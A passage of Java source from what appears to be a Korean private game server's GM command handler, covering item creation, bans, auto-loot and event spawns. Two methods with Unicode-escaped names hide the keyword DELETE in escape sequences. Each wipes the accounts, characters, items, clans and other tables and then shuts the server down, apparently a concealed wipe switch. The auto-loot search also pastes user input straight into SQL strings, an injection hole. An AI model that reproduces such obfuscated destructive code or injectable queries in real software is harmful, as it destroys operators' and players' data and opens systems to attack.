		synchronized (list) {
			if (!list.contains(npc))
				list.add(npc);
		}
	}

	private void get_delete_gfx(L1PcInstance pc) {
		try {
			Iterator<L1NpcInstance> iter = list.iterator();
			L1NpcInstance npc = null;

			while (iter.hasNext()) {
				npc = iter.next();
				if (npc == null)
					continue;
				npc.deleteMe();
			}

			list.clear();
			pc.sendPackets("'이미지 삭제' 가 완료 되었습니다.");
		} catch (Exception e) {
			pc.sendPackets("커멘드: .이미지삭제 로 입력 바랍니다.");
		}
	}

	private static Random _rnd = new Random();

	public static Random getRnd() {
		return _rnd;
	}


	/*
	 * private void showCastleWarTime(L1PcInstance pc, String param) {
	 * L1Castle[] castles = WarTimeController.getInstance().getCastleArray();
	 * Calendar[] startTime =
	 * WarTimeController.getInstance().getWarStartTimeArray(); Calendar[]
	 * endTime = WarTimeController.getInstance().getWarEndTimeArray();
	 * SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
	 * try { StringTokenizer tok = new StringTokenizer(param); String name =
	 * tok.nextToken(); for (int i = 0; i < castles.length; i++) { L1Castle
	 * castle = castles[i]; if (castle.getName().startsWith(name)) {
	 * pc.sendPackets(String.format("%s: %s ~ %s", castle.getName(),
	 * formatter.format(startTime[i].getTime()),
	 * formatter.format(endTime[i].getTime())))); } } Calendar cal =
	 * Calendar.getInstance(); pc.sendPackets(String.format( "서버시간: %s",
	 * formatter.format(cal.getTime())))); } catch (Exception e) {
	 * pc.sendPackets(".공성시간 (켄트,오크,윈다,기란,하이,드워,아덴,디아)")); } }
	 */

	private void maphack(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				SC_Ability.send(gm, 3, true);
				gm.sendPackets("라이트 : 켬");
			} else if (on.equals("끔")) {
				SC_Ability.send(gm, 3, false);
				gm.sendPackets("라이트 : 끔");
			}
		} catch (Exception e) {
			gm.sendPackets(".라이트 [켬, 끔] 으로 설정 하세요.");
		}
	}

	public static int get_random(int min, int max) {
		if (min > max)
			return min;
		return _rnd.nextInt(max - min + 1) + min;
	}
	// TODO GM 커멘드 추가
	private void showHelp(L1PcInstance gm, String filter) {
		final int access = gm.getAccessLevel();
		final boolean full = access == Config.GMCODE;
		final boolean sub = access == Config.SUB_GMCODE;
		if (!full && !sub) return;
		String keyword = filter == null ? "" : filter.trim().toLowerCase(Locale.ROOT);
		if (keyword.startsWith(".")) keyword = keyword.substring(1);
		final Set<String> names = new LinkedHashSet<>();
		for (BuilderCmdPairType entry : builderCmdMap.values()) {
			final String name = entry.getName();
			if (entry.isLegacy() && access != entry.getLevel() && !sub) continue;
			if (!entry.isExecutable() && entry.directHandler() == null) continue;
			if (sub && ("아이템".equals(name) || "오토선물".equals(name))) continue;
			names.add(name);
		}
		SC_SystemMessage.send(gm, "[GM] 명령어 목록 (.h 검색어)");
		final StringBuilder line = new StringBuilder(96);
		int count = 0;
		int columns = 0;
		for (String name : names) {
			if (!name.toLowerCase(Locale.ROOT).contains(keyword)) continue;
			if (columns != 0) line.append("  ");
			line.append('.').append(name);
			count++;
			if (++columns == 6) {
				SC_SystemMessage.send(gm, line.toString());
				line.setLength(0);
				columns = 0;
			}
		}
		if (columns != 0) SC_SystemMessage.send(gm, line.toString());
		SC_SystemMessage.send(gm, "[GM] " + count + "개 명령어");
	}


	private void searchDatabase(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			int type = Integer.parseInt(tok.nextToken());
			String name = tok.nextToken();
			searchObject(gm, type, "%" + name + "%");
		} catch (Exception e) {
			gm.sendPackets(".검색 [0~5] [name]을 입력 해주세요.");
			gm.sendPackets("0=잡템, 1=무기, 2=갑옷, 3=엔피시, 4=변신, 5=엔피시(gfxid)");
		}
	}

    

	private void autoloot(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String type = tok.nextToken();
			if (type.equalsIgnoreCase("리로드")) {
				AutoLoot.getInstance();
				AutoLoot.reload();
				gm.sendPackets("오토루팅 설정이 리로드 되었습니다.");
			} else if (type.equalsIgnoreCase("검색")) {
				String nameid = tok.nextToken();
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from etcitem) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from armor) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from weapon) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
			} else {
				String nameid = tok.nextToken();
				int itemid = 0;
				try {
					itemid = Integer.parseInt(nameid);
				} catch (NumberFormatException e) {
					itemid = CObjectDB.LoadItem().findItemIdByNameWithoutSpace(nameid);
					if (itemid == 0) {
						gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
						return;
					}
				}

				L1Item temp = CObjectDB.GetItem(itemid);
				if (temp == null) {
					gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
					return;
				}
				if (type.equalsIgnoreCase("추가")) {
					if (AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("이미 오토루팅 목록에 있습니다.");
						return;
					}
					AutoLoot.getInstance().storeId(itemid);
					gm.sendPackets("오토루팅 항목에 추가 했습니다.");
				} else if (type.equalsIgnoreCase("삭제")) {
					if (!AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("오토루팅 항목에 해당 아이템이 없습니다.");
						return;
					}
					gm.sendPackets("오토루팅 항목에서 삭제 했습니다.");
					AutoLoot.getInstance().deleteId(itemid);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".오토루팅 리로드");
			gm.sendPackets(".오토루팅 추가|삭제 itemid|name");
			gm.sendPackets(".오토루팅 검색 name");
		}
	}

	private void LargeAreaBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int range = Integer.parseInt(st.nextToken());
			Integer reason = SC_LoginResult.banServerCodes.get(st.nextToken());
			if (reason == null)
				throw new Exception("");
			int count = 0;
			IpTable iptable = IpTable.getInstance();
			pc.sendPackets("----------------------------------------------------");
			for (L1PcInstance player : L1World.getInstance().getVisiblePlayer(pc, range)) {
				Account.ban(player.getAccountName(), reason); // 계정을 BAN시킨다.
				iptable.banIp(player.getNetConnection().getIp()); // BAN 리스트에
				// IP를 추가한다.
				pc.sendPackets(player.getName() + ", (" + player.getAccountName() + ")");
				player.logout();
				player.getNetConnection().kick();
				count++;
			}
			pc.sendPackets("주변의 유저 " + count + "명을 영구추 시키셨습니다.");
			pc.sendPackets("----------------------------------------------------");

		} catch (Exception e) {
			pc.sendPackets(".주변밴  [범위] [압류사유번호]");
		}
	}

	private void spawnNotifyOnOff(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				gm.setBossNotify(true);
				gm.sendPackets("보스알림:켬 (보스소환 및 알림이 실행 되었습니다)");
			} else if (on.equals("끔")) {
				gm.setBossNotify(false);
				gm.sendPackets("보스알림:끔 (보스소환 및 알림이 종료 되었습니다)");
			}
		} catch (Exception e) {
			gm.sendPackets(".보스알림 [켬, 끔]으로 설정하세요. 현재(" + (gm.isBossNotify() == true ? "켜짐" : "꺼짐") + ")입니다.");
		}
	}

	public void execute1(L1PcInstance pc, String cmdName, String arg) {
		try {

			StringTokenizer stringtokenizer = new StringTokenizer(arg);

			int count = Integer.parseInt(stringtokenizer.nextToken());
			L1ItemInstance adena = pc.getInventory().CreateOrAddItem(L1ItemId.ADENA, count);

			if (adena != null) {
				pc.sendPackets((new StringBuilder()).append(count).append("아데나를 생성했습니다.").toString());
			}
		} catch (Exception e) {
			pc.sendPackets((new StringBuilder()).append(".아데나 [액수]로 입력해 주세요. ").toString());
		}
	}

	public void execute(L1PcInstance pc, String param, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String nameid = st.nextToken();
			int count = 1;
			if (st.hasMoreTokens()) {
				count = Integer.parseInt(st.nextToken());
			}
			int enchant = 0;
			if (st.hasMoreTokens()) {
				enchant = Integer.parseInt(st.nextToken());
			}
			int attrenchant = 0;
			if (st.hasMoreTokens()) {
				attrenchant = Integer.parseInt(st.nextToken());
			}

			int itemid = 0;
			try {
				itemid = Integer.parseInt(nameid);
			} catch (NumberFormatException e) {
				itemid = CObjectDB.LoadItem().findItemIdByNameWithoutSpace(nameid);
				if (itemid == 0) {
					pc.sendPackets("해당 아이템이 발견되지 않습니다. ");
					return;
				}
			}
			L1Item temp = CObjectDB.GetItem(itemid);
			if (temp != null) {
				if (temp.isStackable()) {
					L1ItemInstance item = CObjectDB.CreateItem(itemid);
					item.setEnchantLevel(0);
					item.setCount(count);
					item.setIdentified(true);
					if (pc.getInventory().CheckAddable(item, count) == CInventory.OK) {
						pc.getInventory().CreateOrAddItem(item);
						SC_SystemMessage.send(pc, "\\fY아이템:[\\aA" + item.getLogName() + "\\fY] 아이템ID:[\\aA"
								+ itemid + "\\fY] 인챈트:[\\aA" + enchant + "\\fY] \\aG생성");
						;
					}
				} else {
					L1ItemInstance item = null;
					int createCount;
					for (createCount = 0; createCount < count; createCount++) {
						item = CObjectDB.CreateItem(itemid);
						item.setEnchantLevel(enchant);
						item.setAttrEnchantLevel(attrenchant);
						item.setIdentified(true);
						if (pc.getInventory().CheckAddable(item, 1) == CInventory.OK) {
							pc.getInventory().CreateOrAddItem(item);
						} else {
							break;
						}
					}
					if (createCount > 0) {
						SC_SystemMessage.send(pc, "\\fY아이템:[\\aA" + item.getLogName() + "\\fY] 아이템ID:[\\aA"
								+ itemid + "\\fY] 인챈트:[\\aA" + enchant + "\\fY] \\aG생성");
						;
					}
				}
			} else {
				pc.sendPackets("지정 ID의 아이템은 존재하지 않습니다");
			}
		} catch (Exception e) {
			pc.sendPackets(".아이템 [이름] [갯수] [인챈] [속성1~20] [확인0~1] ");
		}
	}


	public static void 할파스의신의(L1PcInstance gm, String param) {
		if (!(gm.getInventory().IsEquippedByClassID(123111) || gm.getInventory().IsEquippedByClassID(123112)
				|| gm.getInventory().IsEquippedByClassID(123113))) {
			gm.sendPackets("\\fY할파스의 갑옷을 착용하고 있지 않습니다.");
			return;
		} else {

			if (gm.hasSkillEffect(L1SkillId.할파스의신의)) {
				int n = gm.getSkillEffectTimeSec(L1SkillId.할파스의신의) / 60;
				SC_SystemMessage.send(gm, String.format("\\fY할파스의 신의 : %d분 후에 활성화됩니다.", n));
			} else {
				gm.sendPackets("\\fY할파스의 신의는 활성화 상태입니다.");

			}
		}
	}
	private void Event(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String event = st.nextToken();
			String time1 = st.nextToken();
			int time = Integer.parseInt(time1);
			if (event.equalsIgnoreCase("드래곤헌터")) {
				L1SpawnUtil.Gmspawn(7320159, 33441, 32813, (short) 4, 6, time * 60 * 60 * 1000);

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "드래곤 헌터의 가호 이벤트가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사1")) {
				L1SpawnUtil.Gmspawn(526, 33447, 32793, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(1) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사2")) {
				L1SpawnUtil.Gmspawn(529, 33445, 32791, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(2) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사3")) {
				L1SpawnUtil.Gmspawn(530, 33449, 32795, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(3) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사4")) {
				L1SpawnUtil.Gmspawn(531, 33444, 32797, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(4) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
			}
		} catch (Exception e) {
			gm.sendPackets("[.이벤트] [이벤트명] [시간]");
			gm.sendPackets("[이벤트명]: 드래곤헌터/특급용사1~4");
		}
	}

	
private void \uC11C\uBC84\uCD08\uAE30\uD6541(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) {
				//L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				//Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				KdaLoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}

private void \uC11C\uBC84\uCD08\uAE30\uD654(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) { 
					Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(3000);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				KdaLoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}

	private void LargeAreaIPBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			String banIp = "";

			L1PcInstance player = L1World.getInstance().getPlayer(charName);

			if (player != null) {
				banIp = player.getNetConnection().getIp();

